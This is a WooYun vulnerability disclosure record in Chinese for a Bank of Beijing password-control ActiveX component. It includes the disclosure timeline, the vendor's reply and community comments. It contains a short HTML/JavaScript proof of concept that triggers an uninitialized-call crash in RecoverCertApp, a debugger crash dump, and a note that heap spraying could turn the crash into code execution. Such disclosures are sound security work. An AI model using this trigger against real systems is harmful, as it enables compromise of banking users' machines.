{"id": 47567, "wybug_id": "wooyun-2014-080417", "wybug_title": "某银行密码安全软件存在远程代码执行漏洞", "wybug_corp": "XX银行", "wybug_author": "路人甲", "wybug_date": "2014-10-22 22:46", "wybug_open_date": "2015-01-20 22:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向公众公开  简要描述： 某银行软件应用接口函数调用未做正确初始化，导致调用一个无效的地址，造成任意代码执行。 详细说明：  北京银行密码控件bjcaotp.exe的BjcaUserCtrl.ocx控件的RecoverCertApp函数调用时，内存为正确初始化，导致调用一个无效的地址，在网页中可以通过预先HeapSpary的技术放置恶意的攻击代码，从而可以造成任意代码的执行。控件下载地址：https://ebank.bankofbeijing.com.cn/bccbpb/downloadBJCA/bjcaotp.exePoc:\n<object id='ooo' classid='CLSID:{F460ADF7-2BCD-4E82-B092-E570F8644638}'></object><script>a=\"A\"while(a.length<557){\ta+=a}fake = ooo.RecoverCertApp(a)</script>\n   漏洞证明：  测试环境win7+ie11安装控件之后，构造webserver，将poc通过浏览器打开\n\n\nCrashinfo(efc.ee4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=006f006c ebx=040c7f78 ecx=031eafe8 edx=0808fcc8 esi=00000000 edi=00000007eip=8e000000 esp=0808fca8 ebp=0808fcd4 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=000102468e000000 ??              ???*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Windows\\system32\\BJCAUS~1.OCX - 0:018> kbChildEBP RetAddr  Args to Child              WARNING: Frame IP not in any known module. Following frames may be wrong.0808fca4 02b88d7c 72492e8b 031eafe8 00000000 0x8e0000000808fcd4 766eee1c 040c7f78 0808fd20 772737eb BJCAUS_1!DllUnregisterServer+0x57c0808fce0 772737eb 040c7f78 7ae468dd 00000000 kernel32!BaseThreadInitThunk+0xe0808fd20 772737be 72492e1a 040c7f78 00000000 ntdll!__RtlUserThreadStart+0x700808fd38 00000000 72492e1a 040c7f78 00000000 ntdll!_RtlUserThreadStart+0x1b0:018> dd eax006f006c  69efb619 282ab981 88000000 0071c6f8006f007c  00000000 282ab99f 88000000 00000000006f008c  00000000 282ab99d 88000000 00000191006f009c  00000cd4 282ab99b 88000000 00000000006f00ac  00000000 282ab999 88001df8 00000191006f00bc  00000cd4 282ab997 88000000 756a6f14006f00cc  00718520 282ab995 88000000 00000000006f00dc  00000000 282ab993 88000000 00000000\n   修复方案：  正确初始化   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：18  确认时间：2014-10-27 10:02 厂商回复：   最新状态： 2014-10-27：评分有误 ，应该为18分。  ", "replys": "漏洞评价：\n评论\n     2014-10-23 00:22 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  又是第三方...    \n     2014-10-23 03:08 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  过几天也来一发可好...    \n     2014-10-29 11:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  18分怎么办    \n     2014-10-31 01:00 |    \t\tBeep \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:4        | 专注PHP漏洞挖掘)\t\t \n  18分怎么办    \n     2015-01-21 08:35 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  求传授，求指导。。。。。。。。。    \n     2015-01-21 10:50 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  怎么获取控件的CLSID？有源码吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 18, "Ranks": null}